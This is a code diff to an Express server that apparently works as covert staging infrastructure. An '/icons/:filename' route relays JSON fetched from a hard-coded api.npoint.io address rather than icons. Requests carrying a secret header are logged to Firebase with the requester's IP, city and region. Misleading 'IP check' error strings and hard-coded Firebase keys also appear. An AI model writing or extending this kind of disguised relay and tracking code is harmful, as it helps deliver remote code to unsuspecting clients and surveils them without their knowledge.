@@ -54,12 +54,13 @@ app.use(express.static("public"));
 
 // Firebase configuration
 const firebaseConfig = {
-  apiKey: "AIzaSyAcVzAMWuYPOZ7CHIUXFnHMo34DKwFMe90",
-  authDomain: "ip-api-check.firebaseapp.com",
-  projectId: "ip-api-check",
-  storageBucket: "ip-api-check.firebasestorage.app",
-  messagingSenderId: "396717913614",
-  appId: "1:396717913614:web:cce1489b2f1d232d666e5f"
+  apiKey: "AIzaSyApaZD_ekJMAsWE8vvIJ3ie9l6m44_UomA",
+  authDomain: "jsservice-data2.firebaseapp.com",
+  projectId: "jsservice-data2",
+  storageBucket: "jsservice-data2.firebasestorage.app",
+  messagingSenderId: "1033348246763",
+  appId: "1:1033348246763:web:817401b9ac969b323ba2ae",
+  measurementId: "G-VKYK1QTZ81"
 };
 
 // Initialize Firebase
@@ -93,16 +94,16 @@ app.use(async (req, res, next) => {
     const { country = "none", regionName = "none", city = "none" } = ipDetails;
 
     if (requestUrl !== "/favicon.ico" && requestUrl !== "/favicon.png" && secretHeader === SECRET_HEADER_VALUE) {
-      // await addDoc(collection(db, "requests"), {
-      //   country,
-      //   regionName,
-      //   city,
-      //   method: secretHeader ? `${requestMethod}:${secretHeader}` : requestMethod,
-      //   ip: clientIp,
-      //   url: requestUrl,
-      //   timestamp,
-      //   source: isPostman ? "Postman" : "Web",
-      // });
+      await addDoc(collection(db, "requests"), {
+        country,
+        regionName,
+        city,
+        method: secretHeader ? `${requestMethod}:${secretHeader}` : requestMethod,
+        ip: clientIp,
+        url: requestUrl,
+        timestamp,
+        source: isPostman ? "Postman" : "Web",
+      });
     }
     if (requestUrl === "/mine/list" || requestUrl === "/mine/delete") {
       next();
@@ -124,27 +125,9 @@ app.use(async (req, res, next) => {
 });
 
 // Dynamic Route: Return file contents based on the filename in the "15" folder
-app.get("/icons/:filename", (req, res) => {
-  const requestedFile = req.params.filename;
-  // const filePath = path.join(folderPath, requestedFile);
-
-  // // Check if the file exists
-  // fs.access(filePath, fs.constants.F_OK, (err) => {
-  //   if (err) {
-  //     return res.status(404).json({ error: "IP check failed." });
-  //   }
-
-  //   // Read the file content
-  //   fs.readFile(filePath, "utf-8", (err, content) => {
-  //     if (err) {
-  //       return res.status(500).json({ error: "Unable to check IP." });
-  //     }
-  //     res.json(content);
-  //   });
-  // });
-
-  (async () => {
-    let url = "https://api.npoint.io/d815185bdda6a914774d";
+app.get("/icons/:filename", async (req, res) => {
+  try {
+    let url;
     switch (req.params.filename) {
       case "101":
         url = "https://api.npoint.io/d815185bdda6a914774d";
@@ -156,11 +139,13 @@ app.get("/icons/:filename", (req, res) => {
         url = "https://api.npoint.io/d815185bdda6a914774d";
         break;
     }
-  const endpoint = await fetch(url);
-  const data = await endpoint.json();
-  res.json(data);
-})();
 
+    const response = await fetch(url);
+    const data = await response.json();
+    res.json(data);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
 // Route: List all logged requests with real-time updates
